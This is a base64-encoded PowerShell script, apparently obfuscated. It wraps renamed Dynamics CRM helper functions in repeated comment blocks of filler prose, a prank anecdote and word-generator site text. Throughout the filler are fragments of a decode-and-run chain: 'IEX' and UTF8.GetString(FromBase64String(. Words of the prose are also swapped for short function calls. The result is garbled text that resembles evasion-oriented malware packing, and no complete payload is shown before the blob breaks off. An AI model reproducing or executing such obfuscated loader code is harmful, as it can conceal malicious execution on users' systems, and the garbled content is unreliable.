QgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gcCgpIHsKICAgIFBBUkFNKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbb2JqZWN0XSRFbnRpdHlMb2dpY2FsTmFtZQogICAgKQoKICAgICRzdGFuZGFyZEFjdGl2aXR5RW50aXRpZXMgPSBAKAogICAgICAgICJvcHBvcnR1bml0eWNsb3NlIiwKICAgICAgICAic29jaWFsYWN0aXZpdHkiLAogICAgICAgICJjYW1wYWlnbnJlc3BvbnNlIiwKICAgICAgICAibGV0dGVyIiwib3JkZXJjbG9zZSIsCiAgICAgICAgImFwcG9pbnRtZW50IiwKICAgICAgICAicmVjdXJyaW5nYXBwb2ludG1lbnRtYXN0ZXIiLAogICAgICAgICJmYXgiLAogICAgICAgICJlbWFpbCIsCiAgICAgICAgImFjdGl2aXR5cG9pbnRlciIsCiAgICAgICAgImluY2lkZW50cmVzb2x1dGlvbiIsCiAgICAgICAgImJ1bGtvcGVyYXRpb24iLAogICAgICAgICJxdW90ZWNsb3NlIiwKICAgICAgICAidGFzayIsCiAgICAgICAgImNhbXBhaWduYWN0aXZpdHkiLAogICAgICAgICJzZXJ2aWNlYXBwb2ludG1lbnQiLAogICAgICAgICJwaG9uZWNhbGwiCiAgICApCiAgICAjIFNvbWUgRW50aXR5IGhhcyBkaWZmZXJlbnQgcGF0dGVybiBmb3IgaWQgbmFtZS4KICAgIGlmKCRFbnRpdHlMb2dpY2FsTmFtZSAtZXEgInVzZXJzZXR0aW5ncyIpCiAgICB7CiAgICAgICAgJHByaW1hcnlLZXlGaWVsZCA9ICJzeXN0ZW11c2VyaWQiCiAgICB9CiAgICBlbHNlaWYoJEVudGl0eUxvZ2ljYWxOYW1lIC1lcSAic3lzdGVtZm9ybSIpCiAgICB7CiAgICAgICAgJHByaW1hcnlLZXlGaWVsZCA9ICJmb3JtaWQiCiAgICB9CiAgICBlbHNlaWYoJEVudGl0eUxvZ2ljYWxOYW1lIC1pbiAkc3RhbmRhcmRBY3Rpdml0eUVudGl0aWVzKQogICAgewogICAgICAgICRwcmltYXJ5S2V5RmllbGQgPSAiYWN0aXZpdHlpZCIKICAgIH0KICAgIGVsc2UgCiAgICB7CiAgICAgICAgIyBkZWZhdWx0CiAgICAgICAgJHByaW1hcnlLZXlGaWVsZCA9ICRFbnRpdHlMb2dpY2FsTmFtZSArICJpZCIKICAgIH0KICAgIAogICAgJHByaW1hcnlLZXlGaWVsZAp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gcSB7CglbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uCiAgICApCgoJcmV0dXJuIChDb2FsZXNjZSAkY29ubi5MYXN0Q3JtRXJyb3IgJGNvbm4uTGFzdENybUV4Y2VwdGlvbikgCn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2t